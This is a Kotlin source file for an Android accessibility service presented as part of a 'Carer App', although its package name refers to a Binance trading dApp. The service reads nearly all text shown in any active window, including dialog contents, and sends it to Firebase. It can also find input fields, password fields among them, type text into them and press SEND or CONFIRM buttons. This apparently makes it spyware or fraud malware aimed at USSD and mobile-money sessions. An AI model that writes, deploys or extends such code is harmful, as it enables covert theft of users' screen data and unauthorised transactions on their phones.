package dApp.binance.Trading.arfu

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log

class CarerAccessibilityService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // Listen for popup windows or text changes
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                
                // Try to get text from the event itself first
                var capturedText = event.text.joinToString("\n")
                
                // If event text is empty, scan the entire active window
                if (capturedText.isBlank()) {
                    capturedText = scanFullWindowText(rootInActiveWindow)
                }

                if (capturedText.isNotBlank() && isLikelyUssdResponse(capturedText)) {
                    Log.d("CarerAccessibility", "Captured USSD: $capturedText")
                    captureAndSendResponse(capturedText)
                }
            }
        }
    }

    private fun scanFullWindowText(node: AccessibilityNodeInfo?): String {
        if (node == null) return ""
        val sb = StringBuilder()
        collectText(node, sb)
        return sb.toString().trim()
    }

    private fun collectText(node: AccessibilityNodeInfo, sb: StringBuilder) {
        node.text?.let {
            if (it.isNotBlank()) {
                sb.append(it).append("\n")
            }
        }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { collectText(it, sb) }
        }
    }

    private fun isLikelyUssdResponse(text: String): Boolean {
        // Basic heuristic: ignore very short texts or known system UI elements
        if (text.length < 3) return false
        val lower = text.lowercase()
        // Ignore common button labels if they are the ONLY text
        if (lower == "ok" || lower == "cancel" || lower == "send") return false
        
        // Ignore app name if it's just the app title (common in window changes)
        if (text.equals("Carer App", ignoreCase = true)) return false
        
        return true
    }

    override fun onInterrupt() {
        // Called when service is interrupted
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("CarerAccessibility", "Accessibility Service connected")

        // Configure service info
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        serviceInfo = info
    }

    /**
     * Type text in USSD input field
     */
    fun typeInUssdDialog(text: String) {
        val rootNode = rootInActiveWindow ?: return

        val inputField = findInputField(rootNode)
        if (inputField != null) {
            val arguments = android.os.Bundle()
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            inputField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
            Log.d("CarerAccessibility", "Typed: $text")

            // Click send button after typing
            Thread.sleep(500)
            clickSendButton(rootNode)
        }
    }

    /**
     * Find and click the "Send" or "OK" button in USSD dialog
     */
    private fun clickSendButton(rootNode: AccessibilityNodeInfo) {
        val buttons = listOf("SEND", "OK", "CONFIRM", "YES")
        
        buttons.forEach { buttonText ->
            val button = findNodeByText(rootNode, buttonText)
            if (button != null && button.isClickable) {
                button.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Log.d("CarerAccessibility", "Clicked button: $buttonText")
                return
            }
        }
    }

    /**
     * Find input field in USSD dialog
     */
    private fun findInputField(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (node.isPassword || node.inputType == android.text.InputType.TYPE_CLASS_NUMBER || 
            node.className?.contains("EditText") == true) {
            return node
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findInputField(child)
            if (result != null) return result
        }

        return null
    }

    /**
     * Find node by text content
     */
    private fun findNodeByText(node: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        if (node.text?.contains(text, ignoreCase = true) == true) {
            return node
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findNodeByText(child, text)
            if (result != null) return result
        }

        return null
    }

    /**
     * Capture response text from USSD dialog and send to Firebase
     */
    private fun captureAndSendResponse(text: String) {
        Log.d("CarerAccessibility", "Capturing response: $text")
        
        val rootNode = rootInActiveWindow
        val hasInputField = rootNode?.let { checkHasInputField(it) } ?: false
        
        // Send to Firebase
        FirebaseLogHelper.logResponse(text, this, hasInputField)
    }
    
    private fun checkHasInputField(node: AccessibilityNodeInfo): Boolean {
        if (node.isPassword || node.inputType == android.text.InputType.TYPE_CLASS_NUMBER || 
            node.className?.contains("EditText") == true) {
            return true
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (checkHasInputField(child)) return true
        }

        return null == null && false // Explicitly return false if not found
    }

    companion object {
        /**
         * Check if accessibility service is enabled
         */
        fun isAccessibilityServiceEnabled(context: Context): Boolean {
            val accessibilityManager = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
            return accessibilityManager.isEnabled && isCarerAccessibilityServiceEnabled(context, accessibilityManager)
        }

        private fun isCarerAccessibilityServiceEnabled(
            context: Context,
            accessibilityManager: android.view.accessibility.AccessibilityManager
        ): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false

            val serviceName = "${context.packageName}/${CarerAccessibilityService::class.java.name}"
            return enabledServices.contains(serviceName)
        }
    }
}
